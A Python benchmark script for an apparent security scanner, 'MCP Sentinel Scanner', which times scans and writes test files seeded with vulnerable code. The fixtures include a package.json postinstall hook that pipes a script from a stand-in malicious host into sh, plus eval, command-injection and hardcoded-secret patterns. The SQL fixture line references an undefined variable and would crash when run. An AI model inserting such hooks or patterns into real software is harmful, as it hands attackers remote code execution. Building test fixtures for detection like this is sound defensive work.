#!/usr/bin/env python3
"""Performance benchmark script for MCP Sentinel Scanner."""

from __future__ import annotations

import argparse
import json
import shutil
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

try:
    import psutil
except ImportError:
    psutil = None  # type: ignore[assignment]

from src.mcp_sentinel_scanner import MCPSentinelScanner
from src.types import ScanResult
from src.unified_scanner import UnifiedScanner

EFFICIENCY_METRIC = (
    "efficiency = (critical_count / total_findings) * (baseline_time_sec / new_time_sec); "
    "at baseline, baseline_time_sec == new_time_sec so the time factor is 1."
)


def triage_counts(result: ScanResult) -> tuple[int, int]:
    """Return (critical_count, total_findings) including advanced_findings."""
    crit = sum(1 for f in result.findings if f.severity == "CRITICAL")
    crit += sum(1 for f in result.advanced_findings if f.severity == "CRITICAL")
    total = len(result.findings) + len(result.advanced_findings)
    return crit, total


def run_corpus_baseline(
    workspace: Path,
    *,
    output_path: Path,
    log_path: Optional[Path] = None,
    tiers: Optional[set[str]] = None,
    reference_total_time_sec: Optional[float] = None,
    log_experiment: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """
    Run MCPSentinelScanner (with configs/security_rules.json) on all corpus repos that
    have a local path under ``configs/repo_corpus.json`` (smoke + full tiers).
    """
    manifest_path = workspace / "configs" / "repo_corpus.json"
    payload = json.loads(manifest_path.read_text(encoding="utf-8"))
    repos: List[Dict[str, Any]] = payload.get("repos", [])
    allowed_tiers = tiers or {"smoke", "full"}
    custom_rules = workspace / "configs" / "security_rules.json"

    per_repo: List[Dict[str, Any]] = []
    errors: List[Dict[str, str]] = []

    print("MCP Sentinel Scanner — corpus baseline (MCPSentinelScanner + custom rules)")
    print("=" * 60)

    for repo in repos:
        tier = str(repo.get("tier", ""))
        if tier not in allowed_tiers:
            continue
        local_rel = repo.get("local_path")
        if not local_rel:
            continue
        repo_path = (workspace / str(local_rel)).resolve()
        if not repo_path.is_dir():
            errors.append({"id": str(repo.get("id")), "error": f"missing path: {repo_path}"})
            continue

        rid = str(repo.get("id"))
        exclude = list(repo.get("exclude", []))
        config: Dict[str, Any] = {
            "exclude": exclude,
            "custom_rules_file": str(custom_rules),
        }

        print(f"\nScanning {rid} -> {repo_path} ...")
        scanner = MCPSentinelScanner(config=config)
        try:
            result = scanner.scan(repo_path)
        except Exception as exc:
            errors.append({"id": rid, "error": str(exc)})
            per_repo.append(
                {
                    "id": rid,
                    "tier": tier,
                    "path": str(repo_path),
                    "error": str(exc),
                }
            )
            print(f"  FAILED: {exc}")
            continue

        critical, total = triage_counts(result)
        duration = float(result.summary.scan_time)
        time_ratio = 1.0
        efficiency = (critical / total * time_ratio) if total else None

        row = {
            "id": rid,
            "tier": tier,
            "path": str(repo_path),
            "duration_sec": round(duration, 4),
            "baseline_time_sec": round(duration, 4),
            "files_scanned": result.summary.files_scanned,
            "total_findings": total,
            "critical_count": critical,
            "severity_distribution": result.summary.severity_distribution,
            "efficiency": round(efficiency, 6) if efficiency is not None else None,
        }
        per_repo.append(row)
        print(
            f"  duration={duration:.2f}s findings={total} critical={critical} "
            f"efficiency={efficiency:.4f}" if efficiency is not None else f"  duration={duration:.2f}s findings=0"
        )

    total_critical = sum(r.get("critical_count", 0) for r in per_repo if "error" not in r)
    total_findings = sum(r.get("total_findings", 0) for r in per_repo if "error" not in r)
    total_time = sum(r.get("duration_sec", 0.0) for r in per_repo if "error" not in r)
    baseline_ref = reference_total_time_sec if reference_total_time_sec is not None else total_time
    time_ratio = (baseline_ref / total_time) if total_time > 0 else 1.0
    purity = (total_critical / total_findings) if total_findings else None
    agg_eff = (purity * time_ratio) if purity is not None else None

    out: Dict[str, Any] = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "metric": EFFICIENCY_METRIC,
        "scanner": "MCPSentinelScanner",
        "custom_rules_file": str(custom_rules),
        "reference_total_time_sec": round(baseline_ref, 4),
        "aggregate": {
            "repos_scanned_ok": len([r for r in per_repo if "error" not in r]),
            "total_critical": total_critical,
            "total_findings": total_findings,
            "total_time_sec": round(total_time, 4),
            "time_ratio_baseline_over_new": round(time_ratio, 6),
            "critical_ratio": round(purity, 6) if purity is not None else None,
            "aggregate_efficiency": round(agg_eff, 6) if agg_eff is not None else None,
        },
        "repos": per_repo,
        "errors": errors,
    }

    output_path.write_text(json.dumps(out, indent=2), encoding="utf-8")
    print(f"\nWrote {output_path}")

    if log_path:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        log_line: Dict[str, Any] = {
            "ts": out["generated_at"],
            "phase": 0,
            "event": "corpus_baseline",
            "output": str(output_path),
            "aggregate_efficiency": out["aggregate"]["aggregate_efficiency"],
            "total_time_sec": out["aggregate"]["total_time_sec"],
        }
        if log_experiment:
            log_line.update(log_experiment)
        with log_path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(log_line) + "\n")
        print(f"Appended log line to {log_path}")

    return out


def benchmark_scanner(scanner, target: Path, name: str) -> Dict[str, float]:
    """Benchmark a scanner and return performance metrics."""
    print(f"\n🔍 Benchmarking {name}...")

    start_time = time.perf_counter()
    start_memory = get_memory_usage()

    try:
        result = scanner.scan(target)

        end_time = time.perf_counter()
        end_memory = get_memory_usage()

        duration = end_time - start_time
        memory_used = end_memory - start_memory

        print(f"✅ {name} completed successfully")
        print(f"   Duration: {duration:.2f}s")
        print(f"   Files scanned: {result.summary.files_scanned}")
        print(f"   Vulnerabilities: {result.summary.vulnerabilities_found}")
        print(f"   Scan speed: {result.summary.files_scanned/duration:.1f} files/sec")
        print(f"   Memory used: {memory_used:.1f} MB")

        return {
            "duration": duration,
            "files_scanned": result.summary.files_scanned,
            "vulnerabilities_found": result.summary.vulnerabilities_found,
            "scan_speed": result.summary.files_scanned / duration,
            "memory_used": memory_used,
            "asr_score": result.summary.asr_score,
        }

    except Exception as e:
        print(f"❌ {name} failed: {e}")
        return {"error": str(e)}


def get_memory_usage() -> float:
    """Get current memory usage in MB."""
    if psutil is None:
        return 0.0
    process = psutil.Process()
    return process.memory_info().rss / 1024 / 1024


def create_test_files(base_path: Path, num_files: int = 50) -> Path:
    """Create test files for benchmarking."""
    test_dir = base_path / "benchmark_test_files"
    test_dir.mkdir(exist_ok=True)

    # Create various file types with different vulnerability patterns
    patterns = [
        "# Clean file\nprint('Hello World')",
        "import os\nos.system('echo test')",  # Command injection
        "password = 'hardcoded-secret-123456789'",  # Hardcoded secret
        "eval(user_input)",  # Dangerous function
        "SELECT * FROM users WHERE id = '" + user_id + "'",  # SQL injection
    ]

    for i in range(num_files):
        file_path = test_dir / f"test_file_{i}.py"
        pattern = patterns[i % len(patterns)]
        file_path.write_text(f"# Test file {i}\n{pattern}\n")

    # Create React files
    react_dir = test_dir / "react_components"
    react_dir.mkdir(exist_ok=True)

    react_patterns = [
        "function Component() { return <div>Clean</div>; }",
        "function Component({html}) { return <div dangerouslySetInnerHTML={{__html: html}} />; }",
        "const API_KEY = 'sk-1234567890abcdef';",
        "localStorage.setItem('token', jwt);",
    ]

    for i, pattern in enumerate(react_patterns):
        file_path = react_dir / f"Component{i}.jsx"
        file_path.write_text(pattern)

    # Create package.json
    package_json = test_dir / "package.json"
    package_json.write_text(
        """{
        "name": "test-project",
        "dependencies": {
            "@internal/secret-package": "1.0.0"
        },
        "scripts": {
            "postinstall": "curl http://malicious.com/script.sh | sh"
        }
    }"""
    )

    return test_dir


def run_benchmarks():
    """Run comprehensive benchmarks."""
    print("🚀 MCP Sentinel Scanner Performance Benchmark")
    print("=" * 50)

    # Create test files
    test_dir = create_test_files(Path("."))
    print(f"📁 Created test files in: {test_dir}")

    # Initialize scanners
    mcp_scanner = MCPSentinelScanner()
    unified_scanner = UnifiedScanner()

    # Run benchmarks
    results = {}

    # Benchmark MCP Scanner
    results["mcp"] = benchmark_scanner(mcp_scanner, test_dir, "MCP Scanner")

    # Benchmark Unified Scanner
    results["unified"] = benchmark_scanner(unified_scanner, test_dir, "Unified Scanner")

    # Compare results
    print("\n📊 Performance Comparison")
    print("=" * 50)

    if "error" not in results["mcp"] and "error" not in results["unified"]:
        mcp_speed = results["mcp"]["scan_speed"]
        unified_speed = results["unified"]["scan_speed"]

        print(f"MCP Scanner:     {mcp_speed:.1f} files/sec")
        print(f"Unified Scanner: {unified_speed:.1f} files/sec")

        if unified_speed > mcp_speed:
            improvement = (unified_speed - mcp_speed) / mcp_speed * 100
            print(f"🚀 Unified Scanner is {improvement:.1f}% faster")
        else:
            degradation = (mcp_speed - unified_speed) / mcp_speed * 100
            print(f"⚠️  Unified Scanner is {degradation:.1f}% slower")

        # Memory comparison
        mcp_memory = results["mcp"]["memory_used"]
        unified_memory = results["unified"]["memory_used"]

        print(f"\nMemory Usage:")
        print(f"MCP Scanner:     {mcp_memory:.1f} MB")
        print(f"Unified Scanner: {unified_memory:.1f} MB")

        # Vulnerability detection comparison
        mcp_vulns = results["mcp"]["vulnerabilities_found"]
        unified_vulns = results["unified"]["vulnerabilities_found"]

        print(f"\nVulnerabilities Found:")
        print(f"MCP Scanner:     {mcp_vulns}")
        print(f"Unified Scanner: {unified_vulns}")

        if unified_vulns > mcp_vulns:
            improvement = unified_vulns - mcp_vulns
            print(f"🎯 Unified Scanner found {improvement} additional vulnerabilities")

    # Performance targets
    print("\n🎯 Performance Targets")
    print("=" * 50)
    print("Target: <60s for 10K LOC")
    print("Target: <512MB memory usage")
    print("Target: >50 files/sec scan speed")

    # Cleanup
    shutil.rmtree(test_dir)
    print(f"\n🧹 Cleaned up test files")


def main() -> None:
    parser = argparse.ArgumentParser(description="MCP Sentinel Scanner benchmarks")
    parser.add_argument(
        "--corpus-baseline",
        action="store_true",
        help="Scan all local corpus repos (configs/repo_corpus.json) and write baseline_efficiency.json",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("baseline_efficiency.json"),
        help="Output path for --corpus-baseline (default: ./baseline_efficiency.json)",
    )
    parser.add_argument(
        "--log",
        type=Path,
        default=Path("optimization_log.jsonl"),
        help="Append JSONL log entry for corpus baseline (default: ./optimization_log.jsonl)",
    )
    args = parser.parse_args()

    if args.corpus_baseline:
        workspace = Path(__file__).resolve().parent.parent
        run_corpus_baseline(workspace, output_path=args.output.resolve(), log_path=args.log.resolve())
        return

    run_benchmarks()


if __name__ == "__main__":
    main()
